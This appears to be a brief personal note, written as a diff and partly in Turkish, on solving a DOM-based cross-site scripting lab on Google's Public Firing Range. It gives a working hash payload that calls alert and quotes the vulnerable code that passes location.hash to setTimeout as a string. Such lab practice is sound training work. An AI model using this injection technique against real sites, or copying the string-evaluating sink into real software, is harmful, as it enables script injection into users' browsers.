@@ -1,0 +1,8 @@
+https://public-firing-range.appspot.com/address/location.hash/setTimeout#--alert(1555)
+
+
+
+
+      var payload = window.location.hash.substr(1);setTimeout('var a=a;' + payload, 1); payload bu kısma geliyor -- kullanarak yeni alert fonksiyonun çağırdım 
+
+    
